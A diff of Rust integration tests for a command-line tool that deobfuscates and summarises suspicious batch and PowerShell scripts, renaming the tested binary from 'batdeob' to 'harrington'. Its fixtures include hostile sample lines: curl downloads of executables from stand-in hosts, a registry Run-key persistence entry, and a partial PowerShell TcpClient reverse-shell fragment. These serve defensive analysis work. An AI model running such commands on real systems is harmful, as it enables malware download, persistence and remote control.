@@ -10,7 +10,7 @@ fn deob_writes_deobfuscated_file() {
     let input = dir.path().join("in.bat");
     fs::write(&input, "set X=hi\r\necho %X%\r\n").expect("write");
     let out_dir = dir.path().join("out");
-    Command::cargo_bin("batdeob")
+    Command::cargo_bin("harrington")
         .expect("bin")
         .args([
             "deob",
@@ -32,7 +32,7 @@ fn deob_writes_extracted_child_bat() {
     let input = dir.path().join("in.bat");
     fs::write(&input, r#"cmd /c "echo hi""#).expect("write");
     let out_dir = dir.path().join("out");
-    Command::cargo_bin("batdeob")
+    Command::cargo_bin("harrington")
         .expect("bin")
         .args([
             "deob",
@@ -60,7 +60,7 @@ fn deob_writes_traits_json() {
     let input = dir.path().join("in.bat");
     fs::write(&input, "echo hi").expect("write");
     let out_dir = dir.path().join("out");
-    Command::cargo_bin("batdeob")
+    Command::cargo_bin("harrington")
         .expect("bin")
         .args([
             "deob",
@@ -141,7 +141,7 @@ fn deob_writes_recovered_pe_blob_and_meta_file() {
     let input = dir.path().join("in.bat");
     fs::write(&input, &script).expect("write");
     let out_dir = dir.path().join("out");
-    Command::cargo_bin("batdeob")
+    Command::cargo_bin("harrington")
         .expect("bin")
         .args([
             "deob",
@@ -194,7 +194,7 @@ fn deob_writes_extracted_ps1() {
     let input = dir.path().join("in.bat");
     fs::write(&input, format!("powershell -EncodedCommand {}", b64)).expect("write");
     let out_dir = dir.path().join("out");
-    Command::cargo_bin("batdeob")
+    Command::cargo_bin("harrington")
         .expect("bin")
         .args([
             "deob",
@@ -232,7 +232,7 @@ fn deob_writes_normalized_ps1_when_readability_improves() {
     let input = dir.path().join("in.bat");
     fs::write(&input, format!("powershell -EncodedCommand {}", b64)).expect("write");
     let out_dir = dir.path().join("out");
-    Command::cargo_bin("batdeob")
+    Command::cargo_bin("harrington")
         .expect("bin")
         .args([
             "deob",
@@ -277,7 +277,7 @@ fn analyze_recurses_into_echoed_encoded_powershell_batch() {
     )
     .expect("write");
 
-    let out = Command::cargo_bin("batdeob")
+    let out = Command::cargo_bin("harrington")
         .expect("bin")
         .args(["analyze", input.to_str().expect("path"), "--jsonl"])
         .output()
@@ -300,7 +300,7 @@ fn analyze_emits_json_to_stdout() {
     let dir = TempDir::new().expect("tmp");
     let input = dir.path().join("in.bat");
     fs::write(&input, "echo plain\r\n").expect("write");
-    let out = Command::cargo_bin("batdeob")
+    let out = Command::cargo_bin("harrington")
         .expect("bin")
         .args(["analyze", input.to_str().expect("path")])
         .output()
@@ -319,7 +319,7 @@ fn report_default_omits_raw_text_includes_full_traits() {
     let dir = TempDir::new().expect("tmp");
     let input = dir.path().join("in.bat");
     fs::write(&input, "curl -o out.exe http://x.example.com/y.exe\r\n").expect("write");
-    let out = Command::cargo_bin("batdeob")
+    let out = Command::cargo_bin("harrington")
         .expect("bin")
         .args(["report", input.to_str().expect("path")])
         .output()
@@ -350,7 +350,7 @@ fn report_include_source_and_deob_inlines_both() {
     let dir = TempDir::new().expect("tmp");
     let input = dir.path().join("in.bat");
     fs::write(&input, "set X=marker_XYZ\r\necho %X%\r\n").expect("write");
-    let out = Command::cargo_bin("batdeob")
+    let out = Command::cargo_bin("harrington")
         .expect("bin")
         .args([
             "report",
@@ -377,7 +377,7 @@ fn analyze_jsonl_emits_lines() {
     let dir = TempDir::new().expect("tmp");
     let input = dir.path().join("in.bat");
     fs::write(&input, "curl http://x/y\r\n").expect("write");
-    let out = Command::cargo_bin("batdeob")
+    let out = Command::cargo_bin("harrington")
         .expect("bin")
         .args(["analyze", input.to_str().expect("path"), "--jsonl"])
         .output()
@@ -404,7 +404,7 @@ fn summarize_emits_compact_report() {
         "curl -o out.exe http://x/y.exe\r\nreg add HKLM\\Run /v Evil /d \"C:\\\\evil.exe\"\r\n",
     )
     .expect("write");
-    let out = Command::cargo_bin("batdeob")
+    let out = Command::cargo_bin("harrington")
         .expect("bin")
         .args(["summarize", input.to_str().expect("path")])
         .output()
@@ -436,7 +436,7 @@ $client = New-Object System.Net.Sockets.TcpClient($ip, $port)
     let input = dir.path().join("rev.ps1");
     fs::write(&input, script).expect("write");
 
-    let assert = Command::cargo_bin("batdeob")
+    let assert = Command::cargo_bin("harrington")
         .expect("bin")
         .args(["summarize", "--tldr", input.to_str().expect("path")])
         .assert()
@@ -489,7 +489,7 @@ $client = New-Object System.Net.Sockets.TcpClient($ip, $port)
     );
     let aes_input = dir.path().join("aes.bat");
     fs::write(&aes_input, &aes_script).expect("write aes");
-    let aes_assert = Command::cargo_bin("batdeob")
+    let aes_assert = Command::cargo_bin("harrington")
         .expect("bin")
         .args(["summarize", "--tldr", aes_input.to_str().expect("path")])
         .assert()
